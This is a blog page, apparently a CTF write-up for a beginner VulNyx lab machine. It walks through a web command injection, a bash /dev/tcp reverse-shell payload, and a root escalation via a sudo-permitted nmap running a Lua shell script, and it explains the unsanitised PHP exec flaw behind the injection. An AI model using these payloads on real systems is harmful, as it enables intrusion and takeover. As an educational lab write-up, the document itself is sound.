@@ -1,0 +1,931 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>VulNyx: HackingStation - hackcommander.github.io</title>
+<meta name="description" content="Partial disclosure of a bug bounty report: human 1 - sqlmap 0: defeating automation through manual exploitation.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.github.io">
+<meta property="og:title" content="VulNyx: HackingStation">
+<meta property="og:url" content="https://hackcommander.github.io/posts/2024/03/30/vulnyx-hackingstation/">
+
+
+  <meta property="og:description" content="Partial disclosure of a bug bounty report: human 1 - sqlmap 0: defeating automation through manual exploitation.">
+
+
+
+  <meta property="og:image" content="https://hackcommander.github.io/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-03-30T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://hackcommander.github.io/posts/2024/03/30/vulnyx-hackingstation/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Iván Santos Malpica",
+      "url": "https://hackcommander.github.io",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+    
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/search/" >Search</a>
+            </li><li class="masthead__menu-item">
+              <a href="/advertising/" >Advertising</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://hackcommander.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#posts" itemprop="item"><span itemprop="name">Posts</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#2024" itemprop="item"><span itemprop="name">2024</span></a>
+          <meta itemprop="position" content="3" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#03" itemprop="item"><span itemprop="name">03</span></a>
+          <meta itemprop="position" content="4" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#30" itemprop="item"><span itemprop="name">30</span></a>
+          <meta itemprop="position" content="5" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">VulNyx&#58; HackingStation</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="Iván Santos Malpica<br>(Aka. HackCommander)" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Iván Santos Malpica<br>(Aka. HackCommander)</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Mathematician and Computer Engineer / Pentester / Bug Bounty Hunter / CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+      
+      
+        <li>
+          <a href="mailto:ivansantosmalpica.contact@gmail.com">
+            <meta itemprop="email" content="ivansantosmalpica.contact@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://www.linkedin.com/in/ivan-santos-malpica" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://hackerone.com/hackcommander" target="_blank">
+            <img src="/assets/images/author-logos/hackerone.svg" alt="HackerOne" style="width: 16px; height: 16px;">
+            HackerOne
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://app.yogosha.com/r/hackcommander" target="_blank">
+            <img src="/assets/images/author-logos/yogosha.svg" alt="Yogosha" style="width: 16px; height: 16px;">
+            Yogosha
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://twitter.com/H4ckC0mm4nd3r" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+      
+      
+        
+          <li>
+            <a href="https://www.youtube.com/@ivansantosmalpica" itemprop="sameAs" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      
+      
+        <li>
+          <a href="https://tryhackme.com/p/HackCommander" target="_blank">
+            <img src="/assets/images/author-logos/tryhackme.svg" alt="TryHackMe" style="width: 15px; height: 15px;">
+            TryHackMe
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://app.hackthebox.com/profile/270539" target="_blank">
+            <img src="/assets/images/author-logos/hackthebox.svg" alt="HackTheBox" style="width: 15px; height: 15px;">
+            HackTheBox
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://www.codewars.com/users/HackCommander" target="_blank">
+            <img src="/assets/images/author-logos/codewars.svg" alt="CodeWars" style="width: 15px; height: 15px;">
+            CodeWars
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://www.buymeacoffee.com/ivansantos" target="_blank">
+            <img src="/assets/images/author-logos/buymeacoffee.svg" alt="Buy Me a Coffee" style="width: 16px; height: 16px;">
+            Buy Me a Coffee
+          </a>
+        </li>
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="VulNyx: HackingStation">
+    <meta itemprop="description" content="Partial disclosure of a bug bounty report: human 1 - sqlmap 0: defeating automation through manual exploitation.">
+    <meta itemprop="datePublished" content="March 30, 2024">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">VulNyx: HackingStation
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-03-30T00:00:00+01:00">March 30, 2024 </time>&emsp;
+          
+          
+        </p>
+        <h2 id="summary">Summary</h2>
+
+<ul>
+  <li><a href="#section-id-1">1. Port and service scanning</a></li>
+  <li><a href="#section-id-2">2. Gaining access</a>
+    <ul>
+      <li><a href="#section-id-2-1">2.1. Detecting the command injection</a></li>
+      <li><a href="#section-id-2-2">2.2. Getting a shell as hacker</a></li>
+      <li><a href="#section-id-2-3">2.3. Why does this command injection exist?</a></li>
+    </ul>
+  </li>
+  <li><a href="#section-id-3">3. Privilege escalation</a>
+    <ul>
+      <li><a href="#section-id-3-1">3.1. Detecting the nmap vulnerability</a></li>
+      <li><a href="#section-id-3-2">3.2. Getting a shell as root</a></li>
+      <li><a href="#section-id-3-3">3.3. Why does this privilege escalation via nmap exist?</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p style="text-align:center;"><img src="/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png" style="width: 800px;" /></p>
+
+<p>In this post we are going to see the writeup of the first machine I have uploaded to VulNyx: HackingStation. It is a very simple machine for beginners in which we are going to get access to the machine through a command injection in a web and then to escalate privileges through a nmap binary, which is allowed to run as superuser without password.</p>
+
+<div id="section-id-1" />
+
+<h2 id="1-port-and-service-scanning">1. Port and service scanning</h2>
+
+<p>After running a port scan</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">--min-rate</span> 10000 10.0.2.17 
+<span class="go">Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-30 21:39 CET
+Nmap scan report for 10.0.2.17
+Host is up (0.00010s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
+</span></code></pre></div></div>
+
+<p>we can see that the port 80 is open and therefore there is a web. Now running a service scan</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-p</span> 80 <span class="nt">-sCV</span> 10.0.2.17     
+<span class="go">Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-30 21:39 CET
+Nmap scan report for 10.0.2.17
+Host is up (0.00029s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: HackingStation
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
+</span></code></pre></div></div>
+
+<p>we can see that there is a webserver <em>Apache httpd 2.4.57</em> running on Debian, but before looking for CVEs it is better to take a look at the web.</p>
+
+<div id="section-id-2" />
+
+<h2 id="2-gaining-access">2. Gaining access</h2>
+
+<div id="section-id-2-1" />
+
+<h2 id="21-detecting-the-command-injection">2.1. Detecting the command injection</h2>
+
+<p>After accessing the web in <em>http://10.0.2.17/</em>, we can see that there is an exploit search functionality.</p>
+
+<p><img src="/assets/images/2024-03-31-vulnyx-hackingstation/web-index.png" alt="" /></p>
+
+<p>For example, searching the term <em>Liferay</em>, yields the following result</p>
+
+<p><img src="/assets/images/2024-03-31-vulnyx-hackingstation/liferay-search.png" alt="" /></p>
+
+<p>The output is a list of exploits for the product <em>Liferay</em>, but it seems to be a functionality under development because the result is not well formatted. Also considering that the word <em>searchsploit</em> appears in the output, it seems quite likely that the site is running the searchsploit console tool in the backend.</p>
+
+<p>If this is happening and the backend doesn’t sanitize the input data, there could be a <a href="https://portswigger.net/web-security/os-command-injection">command injection</a>. During command injection exploitation it is very common to attempt to concatenate commands with the character ;. In this case, the following input</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Liferay;whoami
+</code></pre></div></div>
+
+<p>yields the following result</p>
+
+<p><img src="/assets/images/2024-03-31-vulnyx-hackingstation/whoami-search.png" alt="" /></p>
+
+<p>The result contains at the end the word <em>hacker</em>, which must be the user with which is running the application, so it is confirmed that <strong>the web is vulnerable to command injection</strong>.</p>
+
+<div id="section-id-2-2" />
+
+<h2 id="22-getting-a-shell-as-hacker">2.2. Getting a shell as hacker</h2>
+
+<p>Now is the time to get a shell. First we set up a listener on port 8000 using the command</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nc -nlvp 8000
+</span></code></pre></div></div>
+
+<p>and then send the following payload</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Liferay;bash -c 'bash -i &gt;<span class="err">&amp;</span> /dev/tcp/10.0.2.15/8000 0&gt;<span class="err">&amp;</span>1'
+</code></pre></div></div>
+
+<p>After this, we get a shell with the <em>hacker</em> user and that the user flag is in <em>/home/hacker/user.txt</em>.</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-nlvp</span> 8000
+<span class="go">listening on [any] 8000 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.17] 56646
+bash: cannot set terminal process group (508): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">hacker@HackingStation:/var/www/html$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">whoami
+hacker
+</span><span class="gp">hacker@HackingStation:/var/www/html$</span><span class="w"> </span><span class="nb">cd</span> /home/hacker
+<span class="go">cd /home/hacker
+</span><span class="gp">hacker@HackingStation:/home/hacker$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ls
+snap
+user.txt
+</span></code></pre></div></div>
+
+<div id="section-id-2-3" />
+
+<h2 id="23-why-does-this-command-injection-exist">2.3. Why does this command injection exist?</h2>
+
+<p>As we saw in the captures above, the vulnerability is in the script <em>exploitQuery.php</em>. If we check the content of the script</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hacker@HackingStation:/home/hacker$</span><span class="w"> </span><span class="nb">cd</span> /var/www/html
+<span class="go">cd /var/www/html
+</span><span class="gp">hacker@HackingStation:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ls
+exploitQuery.php
+hacker.jpg
+index.html
+</span><span class="gp">hacker@HackingStation:/var/www/html$</span><span class="w"> </span><span class="nb">cat </span>exploitQuery.php
+<span class="go">cat exploitQuery.php
+&lt;?php
+</span><span class="gp">   exec('searchsploit -wj ' . $</span>_GET[<span class="s1">'product'</span><span class="o">]</span>, <span class="nv">$results</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">   $</span>json_string <span class="o">=</span> json_encode<span class="o">(</span><span class="nv">$results</span>, JSON_PRETTY_PRINT<span class="o">)</span><span class="p">;</span>
+<span class="gp">   echo '&lt;pre&gt;</span><span class="s1">' . $json_string . '</span>&lt;/pre&gt;<span class="s1">'; 
+</span><span class="gp">?&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>we can see that <strong>the product parameter is passed without sanitization to an <a href="https://www.php.net/manual/en/function.exec.php">exec</a> PHP function</strong>, so there is a command injection. It is not recommended to use functions to execute system commands, and if there is no other option, it is mandatory to validate or sanitize the input before passing it to the function.</p>
+
+<p>For example, when we send the payload</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Liferay
+</code></pre></div></div>
+
+<p>payload, what is being executed in the backend is the command</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">searchsploit -wj Liferay
+</span></code></pre></div></div>
+
+<p>However, when we send the following payload</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Liferay;whoami
+</code></pre></div></div>
+
+<p>what is being executed in the backend are the following commands</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">searchsploit -wj Liferay;</span><span class="nb">whoami</span>
+</code></pre></div></div>
+
+<p>In this way, first is executed the command <em>searchsploit -wj Liferay</em> and then the command <em>whoami</em>.</p>
+
+<div id="section-id-3" />
+
+<h2 id="3-privilege-escalation">3. Privilege escalation</h2>
+
+<div id="section-id-3-1" />
+
+<h2 id="31-detecting-the-nmap-vulnerability">3.1. Detecting the nmap vulnerability</h2>
+
+<p>After examining the home directory of the <em>hacker</em> user, there is nothing unusual or suspicious. Returning to the web index we can see that it says the following message</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Coming soon to HackingStation... NMAP!!!!!
+</code></pre></div></div>
+
+<p>Nmap requires superuser permissions for certain use cases so it wouldn’t be strange that, if they are working on developing some web functionality with nmap, they left some misconfigurations about the nmap binary.</p>
+
+<p>The following command</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sudo -l
+</span></code></pre></div></div>
+
+<p>checks the <em>/etc/sudoers</em> file (or any other file specified by the sudoers configuration) to determine what commands and actions are allowed to be executed with elevated privileges via <em>sudo</em>. The result of this command is</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hacker@HackingStation:/home/hacker$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">sudo -l
+Matching Defaults entries for hacker on HackingStation:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User hacker may run the following commands on HackingStation:
+    (root) NOPASSWD: /usr/bin/nmap
+</span></code></pre></div></div>
+
+<p>so we can execute nmap with sudo without password. This doesn’t sound very safe.</p>
+
+<div id="section-id-3-2" />
+
+<h2 id="32-getting-a-shell-as-root">3.2. Getting a shell as root</h2>
+
+<p>Searching in <a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">GTFOBins</a> we get the following result</p>
+
+<p><img src="/assets/images/2024-03-31-vulnyx-hackingstation/gtfobins.png" alt="" /></p>
+
+<p>Checking the version of nmap</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hacker@HackingStation:/home/hacker$</span><span class="w"> </span>nmap <span class="nt">-V</span>
+<span class="go">nmap -V
+Nmap version 7.93 ( https://nmap.org )
+Platform: x86_64-pc-linux-gnu
+Compiled with: liblua-5.3.6 openssl-3.0.11 libssh2-1.10.0 libz-1.2.13 libpcre-8.39 libpcap-1.10.3 nmap-libdnet-1.12 ipv6
+Compiled without:
+Available nsock engines: epoll poll select
+</span></code></pre></div></div>
+
+<p>we can see that the installed nmap is in version 7.93, which means that the second method is not applicable in this case.</p>
+
+<p>On the other hand, the first method is based on nmap functionality to execute scripts written in Lua. So executing that commands we get the following result</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hacker@HackingStation:/home/hacker$</span><span class="w"> </span><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
+<span class="gp">TF=$</span><span class="o">(</span><span class="nb">mktemp</span><span class="o">)</span>                                                                                                                                                                                                                                
+<span class="gp">hacker@HackingStation:/home/hacker$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'os.execute("/bin/sh")'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>                                                                                                                                                                      
+<span class="gp">echo 'os.execute("/bin/sh")' &gt;</span><span class="w"> </span><span class="nv">$TF</span>                                                                                                                                                                                                          
+<span class="gp">hacker@HackingStation:/home/hacker$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">--script</span><span class="o">=</span><span class="nv">$TF</span>                                                                                                                                                                                  
+<span class="gp">sudo nmap --script=$</span>TF                                                                                                                                                                                                                      
+<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-31 01:54 CET                                                                                                                                                                             
+NSE: Warning: Loading '/tmp/tmp.YUNY6mz4mx' -- the recommended file extension is '.nse'.                                                                                                                                                    
+whoami
+root
+cd /root
+ls
+root.txt
+snap
+</span></code></pre></div></div>
+
+<p>We can see that we got a shell with the <em>root</em> user and that the root flag is in <em>/root/root.txt</em>.</p>
+
+<div id="section-id-3-3" />
+
+<h2 id="33-why-does-this-privilege-escalation-via-nmap-exist">3.3. Why does this privilege escalation via nmap exist?</h2>
+
+<p>The function <em>os.execute</em> in Lua allows the execution of operating system commands, so the following Lua code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">os.execute</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>is essentially a shell. <strong>When this Lua code is executed through nmap, a shell will be invoked with the same user that executed nmap</strong>. In this case, if nmap is executed without sudo I get a shell with the <em>hacker</em> user, but if I execute nmap with sudo I execute the shell with the superuser, so I get a <em>root</em> shell.</p>
+
+<p>This can be seen in the following root processes with PIDs from 1137 to 1140.</p>
+
+<p><img src="/assets/images/2024-03-31-vulnyx-hackingstation/root-pids.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#binary-exploitation" class="page__taxonomy-item" rel="tag">binary exploitation</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#nmap" class="page__taxonomy-item" rel="tag">nmap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#vulnyx" class="page__taxonomy-item" rel="tag">vulnyx</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctfs" class="page__taxonomy-item" rel="tag">ctfs</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-03-30T00:00:00+01:00">March 30, 2024</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/posts/2024/03/19/human-1-sqlmap-0-defeating-automation-through-manual-exploitation/" class="pagination--pager" title="Human 1 - sqlmap 0: defeating automation through manual exploitation
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+  <script src="/assets/scripts/copyCode.js"></script>
+
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+<div style="background-color: #333; padding: 20px; text-align: center;">
+  <p style="color: white; font-size: 24px;">⭐ Liked this blog? Give it a <a href="https://github.com/HackCommander/hackcommander.github.io" style="color: white; font-weight: bold;">GitHub star</a>! ⭐</p>
+  <p style="color: white; font-size: 24px;">🔎 Connect with me on <a href="https://www.linkedin.com/in/%E2%98%91iv%C3%A1n-santos-malpica-1023a11b4/" style="color: white; font-weight: bold;">LinkedIn</a> for more hacking and bug bounty content! 🔎</p>
+  <p style="color: white; font-size: 24px;">🛍️ Interested in the products I use? Check out my <a href="https://hackcommander.github.io/advertising/" style="color: white; font-weight: bold;">recommended products</a> page for nice deals! 🛍️</p>
+  <p style="color: white; font-size: 24px;">☕️ If you found this blog helpful, consider <a href="https://www.buymeacoffee.com/ivansantos" style="color: white; font-weight: bold;">buying me a coffee</a>. Thanks a latte! ☕️</p>
+</div>
+<!-- end custom footer snippets -->
+
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 Iván Santos Malpica</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JGTZF7HYRM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-JGTZF7HYRM');
+</script>
+
+
+
+  </body>
+</html>
